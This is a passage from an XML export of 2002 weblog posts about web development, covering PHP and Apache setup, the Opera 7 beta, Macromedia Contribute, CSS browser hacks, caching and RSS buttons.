		<field name="body">&lt;p&gt;I'm now running &lt;a href=&quot;http://qa.php.net/&quot; title=&quot;The PHP Quality Assurance Team&quot;&gt;PHP 4.3.0pre2&lt;/a&gt; and Apache 2 on my Win98 machine, thanks mainly to this &lt;a href=&quot;http://www.phpgeek.com/articles.php?content_id=3&quot; title=&quot;Setting up Apache 2 with PHP&quot;&gt;excellent tutorial&lt;/a&gt; on installing PHP and Apache 2 on Windows. The PHP manual's &lt;a href=&quot;http://www.php.net/manual/en/install.apache.php&quot;&gt;Servers-Apache&lt;/a&gt; page also has a bunch of useful installation advice for Apache 2 in the user comments.&lt;/p&gt; </field>
		<field name="created">2002-11-09 20:56:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">577</field>
		<field name="title">PHP tips and tricks from Rasmus</field>
		<field name="slug">phpTipsAndTricksFromRasmus</field>
		<field name="body">&lt;p&gt;Rasmus Lerdorf has published a &lt;a href=&quot;http://www.lerdorf.com/tips.pdf&quot;&gt;PHP Tips and Tricks&lt;/a&gt; PDF based on a presentation given at the recent PHPCon2002. The file is a veritable goldmine of useful information, covering topics including optimisation, sessions, security, dynamic image/flash/PDF generation and using Squid and MySQL replication to increase the performance of a high traffic site. Spotted on &lt;a href=&quot;http://www.phpdeveloper.org/index.php?id=1056&quot; title=&quot;Tips and Tricks from the Master: a PDF&quot;&gt;PHPDeveloper.org&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-09 21:37:28</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">578</field>
		<field name="title">More geek books</field>
		<field name="slug">moreGeekBooks</field>
		<field name="body">&lt;p&gt;A £5 Amazon gift voucher combined with &lt;a href=&quot;http://www.amazon.co.uk/&quot;&gt;Amazon.co.uk&lt;/a&gt; offering free shipping on orders over £39 has lead me to order 3 more books: &lt;a href=&quot;http://isbn.nu/0596000359&quot;&gt;Information Architecture for the World Wide Web&lt;/a&gt;, &lt;a href=&quot;http://isbn.nu/0789723107&quot;&gt;Don't Make Me Think!&lt;/a&gt; and &lt;a href=&quot;http://isbn.nu/020530902X&quot;&gt;The Elements of Style&lt;/a&gt;. They should arrive on Monday. I wonder if &lt;a href=&quot;http://www.allconsuming.net/&quot;&gt;All Consuming&lt;/a&gt; can pick up on links to &lt;a href=&quot;http://isbn.nu/&quot;&gt;isbn.nu&lt;/a&gt;?&lt;/p&gt;</field>
		<field name="created">2002-11-09 21:47:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">579</field>
		<field name="title">Macromedia Contribute</field>
		<field name="slug">macromediaContribute</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.macromedia.com/software/contribute/&quot;&gt;Macromedia Contribute&lt;/a&gt; is a cut-down version of DreamWeaver designed for end content providers to add and edit content on a static website without fear of breaking the design. Coverage by &lt;a href=&quot;http://www.zeldman.com/daily/1102a.shtml#ala154&quot; title=&quot;holiday weekend edition&quot;&gt;Jeffrey Zeldman&lt;/a&gt;, &lt;a href=&quot;http://www.ordinary-life.net/blog/archives/001469.php&quot; title=&quot;Contribute&quot;&gt;Ordinary Life&lt;/a&gt;, &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000696.php&quot; title=&quot;Macromedia Contribute&quot;&gt;web-graphics&lt;/a&gt; and &lt;a href=&quot;http://www.aaronsw.com/weblog/000727&quot; title=&quot;Is the intuitive hypertext interface finally here?&quot;&gt;Aaron Swartz&lt;/a&gt;, who asks if this is a return to Tim Berners-Lee's original vision of a web where contributing is as easy as browsing.&lt;/p&gt;</field>
		<field name="created">2002-11-12 14:16:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">580</field>
		<field name="title">Leaky abstractions</field>
		<field name="slug">leakyAbstractions</field>
		<field name="body">&lt;p&gt;Joel Spolsky: &lt;a href=&quot;http://www.joelonsoftware.com/articles/LeakyAbstractions.html&quot;&gt;The Law of Leaky Abstractions&lt;/a&gt;&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.joelonsoftware.com/articles/LeakyAbstractions.html&quot;&gt;
&lt;p&gt;Code generation tools which pretend to abstract out something, like all abstractions, leak, and the only way to deal with the leaks competently is to learn about how the abstractions work and what they are abstracting. So the abstractions save us time working, but they don't save us time learning.&lt;/p&gt;

&lt;p&gt;And all this means that paradoxically, even as we have higher and higher level programming tools with better and better abstractions, becoming a proficient programmer is getting harder and harder.&lt;/p&gt;
&lt;/blockquote&gt;</field>
		<field name="created">2002-11-12 14:33:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">581</field>
		<field name="title">DOM inspector tutorial</field>
		<field name="slug">domInspectorTutorial</field>
		<field name="body">&lt;p&gt;An &lt;a href=&quot;http://www.brownhen.com/DI.html&quot;&gt;Introduction to the DOM Inspector&lt;/a&gt; (via &lt;a href=&quot;http://www.scottandrew.com/weblog/2002_11#a000461&quot; title=&quot;DOM Inspector Intro&quot;&gt;Scott Andrew&lt;/a&gt;). The DOM inspector is a powerful but little-known tool that comes packaged with Mozilla and can be used to interactively browse through the DOM of both Mozilla interface components and any web page. The article mainly discusses using the inspector to investigate Mozilla internals, but as a web developer I frequently use it to analyse pages and see how they work. It is also great for tweaking other people's sites in my browser (see my post covering &lt;a href=&quot;http://simon.incutio.com/archive/2002/10/24/#tweakingSitesForReadability&quot;&gt;Jeffrey Zeldman's redesign&lt;/a&gt; for an example of this).&lt;/p&gt;</field>
		<field name="created">2002-11-12 14:44:35</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">582</field>
		<field name="title">Patterns for web sites</field>
		<field name="slug">patternsForWebSites</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.rdrop.com/~half/Creations/Writings/Web.patterns/index.html&quot;&gt;Patterns for Personal Web Sites&lt;/a&gt; (via &lt;a href=&quot;http://poorbuthappy.com/ease/000562.html&quot; title=&quot;November 11, 2002&quot;&gt;Peter&lt;/a&gt;) - a fun and (as far as I know) original concept.&lt;/p&gt;</field>
		<field name="created">2002-11-12 15:09:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">583</field>
		<field name="title">Opera 7 Beta</field>
		<field name="slug">opera7beta</field>
		<field name="body">&lt;p&gt;Opera have released the first &lt;a href=&quot;http://www.opera.com/news/&quot; title=&quot;Opera 7 for Windows Beta 1&quot;&gt;public beta&lt;/a&gt; of their new browser, Opera 7. The new version promises to be smaller, faster and have better DOM support than Opera 6. My observations so far:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;They have a navigation bar (as seen in Mozilla, additional navigation based on any &lt;code&gt;&amp;lt;link&amp;gt;&lt;/code&gt; elements on the page)&lt;/li&gt;
&lt;li&gt;Stylesheet switchers (as seen on &lt;a href=&quot;http://www.alistapart.com/&quot;&gt;ALA&lt;/a&gt;, &lt;a href=&quot;http://www.meyerweb.com/&quot;&gt;meyerweb&lt;/a&gt;, &lt;a href=&quot;http://www.wired.com/&quot;&gt;Wired&lt;/a&gt;) work - a clear indication of better DOM support&lt;/li&gt;
&lt;li&gt;Funky DHTML effects from nested lists (as seen on &lt;a href=&quot;http://www.gazingus.org/dhtml/?id=109&quot; title=&quot;Using Lists for DHTML Menus&quot;&gt;gazingus&lt;/a&gt; and &lt;a href=&quot;http://www.kryogenix.org/code/browser/aqlists/&quot; title=&quot;Unobtrusive DHTML, and the power of unordered lists&quot;&gt;kryogenix&lt;/a&gt;) do &lt;em&gt;not&lt;/em&gt; work. Looks like the DOM support isn't quite there yet.&lt;/li&gt;
&lt;li&gt;Some pages fail to display in a readable form at all - examples so far are &lt;a href=&quot;http://www.surfmind.com/&quot;&gt;SurfMind&lt;/a&gt; and &lt;a href=&quot;http://bodytag.org/&quot;&gt;bodytag.org&lt;/a&gt; (which continues loading infinitely - when I stopped it it had already downloaded over 3MB according to Opera's status bar).&lt;/li&gt;
&lt;li&gt;Javascript errors are accompanied by a popup window containing a back trace and extracts from the code that went wrong. &lt;em&gt;Nice&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;When it works, it's &lt;em&gt;fast&lt;/em&gt;.&lt;/li&gt;
&lt;li&gt;A preview feature for small-screen browsing has been included - hit shift-F11 to see what a page would look like on an Opera small-screen enabled mobile device.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Verdict: Needs work - but then it's a beta so that's pretty much to be expected.&lt;/p&gt;
</field>
		<field name="created">2002-11-13 10:45:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">584</field>
		<field name="title">More Opera 7 links</field>
		<field name="slug">moreOpera7Links</field>
		<field name="body">&lt;p&gt;Some more Opera 7 links:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://archivist.incutio.com/css-discuss/?id=15953&quot; title=&quot;[css-d] Opera 7 Beta&quot;&gt;Opera 7 thread on css-discuss&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.opera.com/docs/specs/opera07/&quot;&gt;Web Specifications Supported in Opera 7 beta&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.opera.com/windows/changelogs/700b1/&quot;&gt;Opera 7 for Windows Changelogs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.opera.com/support/helpfiles/index.html&quot;&gt;Welcome to Opera 7 Beta&lt;/a&gt; (On-line Help)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.opera.com/support/helpfiles/m2tutorial.html&quot;&gt;M2 Testing Tutorial&lt;/a&gt; 
(M2 is the new mail client)&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2002-11-13 11:48:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">585</field>
		<field name="title">K-Logging pilot</field>
		<field name="slug">kLoggingPilot</field>
		<field name="body">&lt;p&gt;Rick Klau: &lt;a href=&quot;http://www.rklau.com/tins/stories/2002/11/11/klogPilotRecap.html&quot;&gt;A K-Log Pilot Recap&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.rklau.com/tins/stories/2002/11/11/klogPilotRecap.html&quot;&gt;
&lt;p&gt;Given the flexible nature of weblogs (unlike structured applications, weblogs really can be what you want them to be), it wasn't entirely surprising to see users shape their own expectations in testing out the software:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;A senior developer saw Radio as a great annotated bookmark tool - a way to save URLs and provide his own commentary for others in his team.&lt;/li&gt;
&lt;li&gt;A marketing manager saw Radio mostly as a clipping service - the ability to snag snippets from other web sites to save to her own site.&lt;/li&gt;
&lt;li&gt;A sales person used Radio to distribute industry news relevant to other sales people.&lt;/li&gt;
&lt;li&gt;A QA tester who frequently lunches with customers in training often provided recaps of discussions at lunch - sharing the customers' interests and inquiries.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Rick's conclusion is a cautious thumbs up. Thomas N. Burg has posted &lt;a href=&quot;http://radio.weblogs.com/0104937/2002/11/12.html#a861&quot;&gt;some thoughts&lt;/a&gt; on Rick's experiment.&lt;/p&gt;</field>
		<field name="created">2002-11-13 13:20:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">586</field>
		<field name="title">Blogspace census</field>
		<field name="slug">blogspaceCensus</field>
		<field name="body">&lt;p&gt;Phil Wolff: &lt;a href=&quot;http://dijest.com/aka/categories/klogs/2002/11/10.html#a2239&quot;&gt;We need a census of blogspace&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-13 13:31:46</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">587</field>
		<field name="title">Open source web editing</field>
		<field name="slug">openSourceWebEditing</field>
		<field name="body">&lt;p&gt;While reading the &lt;a href=&quot;http://www.37signals.com/svn/comment.php?postID=540&quot; title=&quot;Will you Contribute?&quot;&gt;thread&lt;/a&gt; discussing Macromedia's Contribute over on 37signals I realised something: the web could really do with an open source Contribute style application. Editing full documents is best done in an application - there's only so much you can do with browser based editing tools (even if you take advantage of &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;'s contendEditable or use Flash to build an editor applet). When people are using Word they hit Ctrl+S to instantly save what they working on - show me a browser based editor with the same functionality.&lt;/p&gt;

&lt;p&gt;Then it hit me. The open source community already &lt;em&gt;has&lt;/em&gt; the beginnings of a desktop &lt;acronym title=&quot;What You See Is What You Get&quot;&gt;WYSIWYG&lt;/acronym&gt; content editing application in Mozilla's &lt;a href=&quot;http://www.mozilla.org/editor/&quot;&gt;Composer&lt;/a&gt;. Composer is often overlooked, but the few times I have tried it it has proved to be a remarkably powerful piece of software. Imagine an open source project inspired by Contribute, based on Composer but with support for &lt;acronym title=&quot;eXtensible Markup Language - Remote Procedure Calls&quot;&gt;XML-RPC&lt;/acronym&gt; and &lt;acronym title=&quot;Simple Object Access Protocol&quot;&gt;SOAP&lt;/acronym&gt; in addition to &lt;acronym title=&quot;File Transfer Protocol&quot;&gt;FTP&lt;/acronym&gt; (the Mozilla code base has libraries for all 3). &lt;acronym title=&quot;Content Management System&quot;&gt;CMS&lt;/acronym&gt; vendors could use it to build powerful, cross-platform editing applications for their existing systems, bloggers could use it to update their blogs (through support for something like the &lt;a href=&quot;http://www.xmlrpc.com/metaWeblogApi&quot;&gt;MetaWeblog API&lt;/a&gt;, schools and colleges could use the FTP version to encourage non technical users to update sites simply (as Contribute does now).&lt;/p&gt;

&lt;p&gt;Now if only I knew &lt;acronym title=&quot;XML-based User Interface Language&quot;&gt;XUL&lt;/acronym&gt;...&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Update:&lt;/em&gt; Whaddya know, there's even a document on &lt;a href=&quot;http://www.mozilla.org/editor/editor-embedding.html&quot;&gt;embedding the editor&lt;/a&gt; right there on the Composer site.&lt;/p&gt;</field>
		<field name="created">2002-11-13 22:24:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">588</field>
		<field name="title">High end CMS vendors in trouble</field>
		<field name="slug">highEndCmsVendorsInTrouble</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.skippingdot.net/2002/11/12&quot;&gt;Licenses Down, Services Up&lt;/a&gt; is a fascinating article discussing the commoditising effect of open source software which uses the high-end Content Management market (such as Interwoven, BroadVision and Vignette) to demonstrate how open source is causing real problems for companies that rely on ludicrously high license fees as their main revenue stream. The conclusion?&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.skippingdot.net/2002/11/12&quot;&gt;&lt;p&gt;
I like to speak in absolutes when I can, it's easier that way, so if you ask me, I'd say these companies are already dead.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The article also looks at Oracle and the inroads being made by popular open source database packages such as PostgreSQL and mySQL.&lt;/p&gt;</field>
		<field name="created">2002-11-16 13:46:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">589</field>
		<field name="title">Funky caching explained</field>
		<field name="slug">funkyCachingExplained</field>
		<field name="body">&lt;p&gt;I didn't take much notice of &quot;funky caching&quot; while reading through Rasmus Lerdorf's &lt;a href=&quot;http://www.lerdorf.com/tips.pdf&quot;&gt;PHP tips and tricks&lt;/a&gt; presentation - I saw that it was talking about using custom 404 pages to serve up dynamic content depending on the URL and wrote it off as a hack that, while useful, was fundamentally flawed in that it would add an error log entry whenever a page was served.&lt;/p&gt;

&lt;p&gt;It seems I was mistaken. Phil Ringnalda has &lt;a href=&quot;http://philringnalda.com/archives/002388.php&quot; title=&quot;Half-baked, and a little fried&quot;&gt;explained the concept&lt;/a&gt; in more detail, and it's actually a very clever angle on the caching problem. Rather than building content in advanced (the &quot;baked&quot; method, used by Moveable Type) or generating the page dynamically each time (the &quot;fried&quot; method, used by my weblog) you set up a custom 404 script which decides whether or not the requested content should exist when it is called. If the content is meant to be there, it creates the content, serves it up and saves it to the file system (so future requests will get the file rather than a 404). To regenerate content you just delete the static file and wait for someone to request it, at which point it will be rebuilt by the 404 script. Clever stuff.&lt;/p&gt;</field>
		<field name="created">2002-11-16 13:54:21</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">590</field>
		<field name="title">Usability Views</field>
		<field name="slug">usabilityViews</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.usabilityviews.com/&quot;&gt;Usability Views&lt;/a&gt; (via &lt;a href=&quot;http://www.zeldman.com/daily/1102b.shtml#brokenheart&quot;&gt;Zeldman&lt;/a&gt;) lists articles from a number of Usability related sites in a variety of different ways, including order-by-most-popular. Popularity appears to be judged by the number of links to that article around the web - I doubt the site is indexing the whole web so could this be another (very clever) application of the Google Web API? Grabbing the number of results for a Google link: query should be easy enough, and would be a great way of judging the popularity of external content. Here's hoping Usability Views adds a &quot;how this works&quot; page in the near future to satisfy my inner geek.&lt;/p&gt;</field>
		<field name="created">2002-11-16 14:00:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">591</field>
		<field name="title">Douglas Bowman goes it alone</field>
		<field name="slug">douglasBowmanGoesItAlone</field>
		<field name="body">&lt;p&gt;Douglas Bowman has &lt;a href=&quot;http://www.stopdesign.com/log.asp?date=20021115&quot; title=&quot;Changing Chapters&quot;&gt;left Wired&lt;/a&gt;, and is striking out on his own with &lt;a href=&quot;http://www.stopdesign.com/&quot;&gt;Stop Design&lt;/a&gt;, his one man consultancy business. With the &lt;a href=&quot;http://www.wired.com/news/culture/0,1284,55675-2,00.html&quot;&gt;Wired redesign&lt;/a&gt; Douglas gave a massive and long-awaited boost to the web standards movement by demonstrating once and for all that a large, high traffic site could make the transition to structural markup and standards compliant code. I wish him the best of luck in his new venture, and I look forward to keeping up with further developments via his excellent &lt;a href=&quot;http://www.stopdesign.com/log.asp&quot; title=&quot;[stop design] log entries by month&quot;&gt;weblog&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-16 14:13:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">592</field>
		<field name="title">Structured procrastination</field>
		<field name="slug">structuredProcrastination</field>
		<field name="body">&lt;p&gt;Thanks to &lt;a href=&quot;http://www.disobey.com/dnn/2002/11/index.shtml#001408&quot; title=&quot;the disobey nonsense network&quot;&gt;Morbus&lt;/a&gt;, I have finally found a time management system that looks like it could work for me: &lt;a href=&quot;http://www-csli.stanford.edu/~john/procrastination.html&quot;&gt;Structured Procrastination&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote cite=&quot;http://www-csli.stanford.edu/~john/procrastination.html&quot;&gt;&lt;p&gt;
[...] the procrastinator can be motivated to do difficult, timely and important tasks, as long as these tasks are a way of not doing something more important. Structured procrastination means shaping the structure of the tasks one has to do in a way that exploits this fact. The list of tasks one has in mind will be ordered by importance. Tasks that seem most urgent and important are on top. But there are also worthwhile tasks to perform lower down on the list. Doing these tasks becomes a way of not doing the things higher up on the list. With this sort of appropriate task structure, the procrastinator becomes a useful citizen. Indeed, the procrastinator can even acquire, as I have, a reputation for getting a lot done. &lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-11-19 00:51:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">593</field>
		<field name="title">Microsoft will be around for a very long time...</field>
		<field name="slug">microsoftWillBeAroundForAVeryL</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://newsvote.bbc.co.uk/1/hi/technology/2480001.stm&quot; title=&quot;Xbox losses fail to rock Microsoft&quot;&gt;This story on the BBC&lt;/a&gt; describing how Microsoft lost £112 million on the Xbox has been getting a lot of attention later. Here's a depressing thought: With 40 billion dollars in the bank they could sustain that rate of loss for &lt;em&gt;85 years&lt;/em&gt; without running out of cash. Scary.&lt;/p&gt;</field>
		<field name="created">2002-11-19 01:02:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">594</field>
		<field name="title">A royalty free web</field>
		<field name="slug">aRoyaltyFreeWeb</field>
		<field name="body">&lt;p&gt;Stuart &lt;a href=&quot;http://www.kryogenix.org/days/000364.cas&quot; title=&quot;No RAND in W3C standards&quot;&gt;points out&lt;/a&gt; that the W3C are seeking public approval for their recently published last-call draft of their &lt;a href=&quot;http://www.w3.org/TR/patent-policy/&quot;&gt;patent policy&lt;/a&gt;. The email address is &lt;a href=&quot;www-patentpolicy-comment@w3.org&quot;&gt;www-patentpolicy-comment@w3.org&lt;/a&gt;. Show them your support for a royalty-free web.&lt;/p&gt;</field>
		<field name="created">2002-11-20 15:53:00</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">595</field>
		<field name="title">OmniWeb CSS hack</field>
		<field name="slug">omniWebCssHack</field>
		<field name="body">&lt;p&gt;The hack we've all been waiting for: &lt;a href=&quot;http://www.macedition.com/cb/cb_20021118.php&quot; title=&quot;The one bug the Omni Group must not fix&quot;&gt;How to hide CSS from OmniWeb&lt;/a&gt;. OmniWeb is a Mac browser which understands the @import rule but horribly mangles CSS layouts beyond all repair. Thanks to this hack CSS sites with a noticeable percentage of OmniWeb users (and anyone else who cares) can give OmniWeb the same treatment normally reserved for Netscape 4.&lt;/p&gt;</field>
		<field name="created">2002-11-20 15:54:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">596</field>
		<field name="title">Condiment Clothing goodness</field>
		<field name="slug">condimentClothingGoodness</field>
		<field name="body">&lt;p&gt;Thanks to &lt;a href=&quot;http://www.cafeshops.com/&quot;&gt;CafeShops&lt;/a&gt;, pretty much anyone can set up a store to flog their own branded merchandise. Long time a favourite obscure site of mine, the &lt;a href=&quot;http://www.clearfour.com/condiment/&quot;&gt;Condiment Packet Museum&lt;/a&gt; now has their &lt;a href=&quot;http://www.cafeshops.com/cp/store.aspx?s=cpm&quot; title=&quot;The Condiment Packet Museum Store&quot;&gt;own line of goods&lt;/a&gt;. Dig those boxer shorts :)&lt;/p&gt;</field>
		<field name="created">2002-11-20 16:00:04</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">597</field>
		<field name="title">A plea for sense</field>
		<field name="slug">aPleaForSense</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://poorbuthappy.com/ease/000595.html&quot;&gt;Peter Van Dijck&lt;/a&gt;: &lt;q cite=&quot;http://poorbuthappy.com/ease/000595.html&quot;&gt;We need some sense in the naming of XML feed buttons.&lt;/q&gt;. I couldn't agree more - in this day of syndication formats left, right and center the orange &lt;acronym title=&quot;eXtensible Markup Language&quot;&gt;XML&lt;/acronym&gt; button could mean just about &lt;em&gt;anything&lt;/em&gt;. Speaking of which, I've finally got around to adding a pretty blue &lt;acronym title=&quot;Really Simple Syndication&quot;&gt;RSS&lt;/acronym&gt; button to this site.&lt;/p&gt;</field>
		<field name="created">2002-11-20 16:31:48</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">598</field>
		<field name="title">Content inventory tips</field>
		<field name="slug">contentInventoryTips</field>
		<field name="body">&lt;p&gt;Peter has been blogging the progress of a 3828 page content inventory he is working on. &lt;a href=&quot;http://poorbuthappy.com/ease/000591.html&quot; title=&quot;Content Inventory day 2&quot;&gt;Day Two&lt;/a&gt; describes his method of working with Excel, &lt;a href=&quot;http://poorbuthappy.com/ease/000598.html&quot; title=&quot;Content Inventory Day Three&quot;&gt;Day Three&lt;/a&gt; provides three useful inventory tips. Christina Wodtke's &lt;a href=&quot;http://www.blueprintsfortheweb.com/&quot;&gt;Information Architecture: Blueprints for the Web&lt;/a&gt; has a nice overview of the content inventory process which recommends a dual monitor setup and links (well, footnotes) to &lt;a href=&quot;http://www.carboniq.com/log/archives/00000131.html&quot; title=&quot;Content inventory checklist&quot;&gt;these tips&lt;/a&gt; by Noel Franus. Peter has also commented on my decision to go with the blue RSS button in favour of the standard orange XML button - I've posted my reasons in a comment attached to &lt;a href=&quot;http://poorbuthappy.com/ease/000599.html&quot;&gt;his post&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-11-20 22:43:20</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">599</field>
		<field name="title">Syndicated further reading recommendations</field>
		<field name="slug">syndicatedFurtherReadingRecomm</field>
		<field name="body">&lt;p&gt;I frequently find myself reading something on someone elses blog and thinking &quot;that's interesting, and it fits in well with XXX that I read the other day&quot;. I often end up blogging a link to both just to satisfy my need for completeness. Wouldn't it be interesting if there was some standard for formalising this kind of further reading recommendation? I'm not sure exactly how it would work (it would almost certainly be XML based but I don't know if it would require a new format or integrate with an existing one) but it could be an interesting avenue to explore. I think it's a significantly different problem to the ones solved by XFML (external shared metadata) and Pingback for it to be worth committing some thought cycles to. Any ideas?&lt;/p&gt;</field>
		<field name="created">2002-11-20 22:49:01</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">600</field>
		<field name="title">Different browsers different DOMs</field>
		<field name="slug">differentBrowsersDifferentDoms</field>
		<field name="body">&lt;p&gt;Hixie has put together a &lt;a href=&quot;http://ln.hixie.ch/?start=1037910467&amp;amp;count=1&quot; title=&quot;Tag Soup: How UAs handle &amp;lt;x&amp;gt; &amp;lt;y&amp;gt; &amp;lt;/x&amp;gt; &amp;lt;/y&amp;gt;&quot;&gt;fascinating article&lt;/a&gt; describing how the Mozilla, Opera 7 beta and &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt;6 &lt;acronym title=&quot;Document Object Model&quot;&gt;DOM&lt;/acronym&gt;s deal with incorrectly nested &lt;acronym title=&quot;HyperText Markup Language&quot;&gt;HTML&lt;/acronym&gt; tags. Internet Explorer goes as far as creating a malformed tree just to represent badly formed HTML!&lt;/p&gt;</field>
		<field name="created">2002-11-21 23:06:45</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">601</field>
		<field name="title">Search engines don't care!</field>
		<field name="slug">searchEnginesDontCare</field>
		<field name="body">&lt;p&gt;I've suspected this for ages, but finally it can be categorically announced that search engines &lt;a href=&quot;http://searchenginewatch.com/sereport/02/10-meta.html&quot; title=&quot;Death Of A Meta Tag&quot;&gt;just don't care&lt;/a&gt; about the meta keywords attribute. The only major engine that still notices it is Inktomi, and even they treat it as a very low priority. Finally something concrete to refer people who still demand meta tags to. The description tag is still occasionally worth adding though.&lt;/p&gt;</field>
		<field name="created">2002-11-21 23:55:02</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">602</field>
		<field name="title">Changing backgrounds</field>
		<field name="slug">changingBackgrounds</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.holovaty.com/blog/archive/2002/11/21/1253&quot;&gt;Adrian Holovaty&lt;/a&gt;, Matt Jones &lt;a href=&quot;http://www.blackbeltjones.com/work/mt/archives/000426.html#000426&quot; title=&quot;Auntie&amp;apos;s facelift&quot;&gt;points out&lt;/a&gt; an innovative new feature of the BBC's &lt;a href=&quot;http://www.bbc.co.uk/&quot;&gt;new home page&lt;/a&gt; - background colours that adapt to your browsing preferences. Interesting stuff.&lt;/p&gt;</field>
		<field name="created">2002-11-21 23:59:23</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">603</field>
		<field name="title">Mark's tinkerings</field>
		<field name="slug">marksTinkerings</field>
		<field name="body">&lt;p&gt;Mark's back, and he's been &lt;a href=&quot;http://diveintomark.org/archives/2002/11/22.html#tinkering&quot;&gt;tinkering&lt;/a&gt;. In addition to a whole bunch of changes made &lt;a href=&quot;http://diveintomark.org/archives/2002/11/21.html#a_warning_to_others&quot; title=&quot;A warning to others&quot;&gt;yesterday&lt;/a&gt; in response to Hixie's &lt;a href=&quot;http://ln.hixie.ch/?start=1037595583&amp;amp;count=1&quot; title=&quot;Markup Challenge: diveintomark.org &quot;&gt;markup critique&lt;/a&gt;, Mark now boasts &lt;a href=&quot;http://www.php.net/urlhowto.php&quot;&gt;php.net style&lt;/a&gt; shortcut &lt;acronym title=&quot;Uniform Resource Locators&quot;&gt;URL&lt;/acronym&gt;s, an &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt; powered &lt;a href=&quot;http://diveintomark.org/about/&quot;&gt;about page&lt;/a&gt; and an automatically generated &lt;a href=&quot;http://diveintomark.org/accessibility_statement.html&quot; title=&quot;Accessibility statement for diveintomark.org &quot;&gt;list of acronyms&lt;/a&gt; (in a semantically correct definition list). I use a similar technique (extracting structural markup tags using regular expressions) in my &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/notes/Maths4Apps/&quot; title=&quot;Mathematics For Applications (uses frames)&quot;&gt;personal course notes&lt;/a&gt; - there's something very rewarding about being able to extract information from a properly marked up document.&lt;/p&gt;</field>
		<field name="created">2002-11-22 10:44:59</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">604</field>
		<field name="title">Interesting but ultimately useless</field>
		<field name="slug">interestingButUltimatelyUseles</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.kryogenix.org/days/000369.cas&quot; title=&quot;Code and HTML and code, oh my!&quot;&gt;Stuart&lt;/a&gt;, Tantek has an &lt;a href=&quot;http://www.tantek.com/log/2002/11.html#L20021121t1730&quot; title=&quot;Semantic Scripting&quot;&gt;intriguing&lt;/a&gt; new (valid) hack for adding HTML documentation to an external javascript file. The hack uses some clever multi-language comments to hide the HTML in the file from the script interpreter, while ensuring that the documentation remains readable when the file is interpreted as HTML. Unfortunately the trick does not work in Mozilla, as that browser respects the Content-Type served with the document (whereas &lt;acronym title=&quot;Internet Explorer&quot;&gt;IE&lt;/acronym&gt; &quot;guesses&quot; the content is HTML from clues in the document).&lt;/p&gt;</field>
		<field name="created">2002-11-22 22:42:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">605</field>
		<field name="title">Aquari-gone-ics</field>
		<field name="slug">aquariGoneIcs</field>
